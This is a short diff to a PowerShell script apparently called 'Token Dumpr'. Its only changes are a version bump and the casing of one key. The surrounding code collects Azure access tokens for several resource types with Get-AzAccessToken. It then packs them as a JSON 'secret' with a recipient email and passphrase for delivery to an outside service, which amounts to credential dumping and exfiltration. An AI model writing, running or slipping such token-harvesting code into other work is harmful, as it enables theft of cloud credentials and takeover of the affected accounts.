@@ -9,7 +9,7 @@ function AccessToken {
     try {
         $tokens = @()
 
-        Write-Host "--- Token Dumpr v1.0.3 ---"
+        Write-Host "--- Token Dumpr v1.0.4 ---"
         foreach ($resourceTypeName in $resourceTypeNames) {
             try {
                 $accessToken = (Get-AzAccessToken -ResourceTypeName $resourceTypeName)
@@ -31,7 +31,7 @@ function AccessToken {
             Body   = @{
                 secret     = $tokens | ConvertTo-Json -Depth 10
                 ttl        = 3600
-                recipient  = $($receiptEmail)
+                Recipient  = $($receiptEmail)
                 passphrase = $($passphrase)
             }
         }
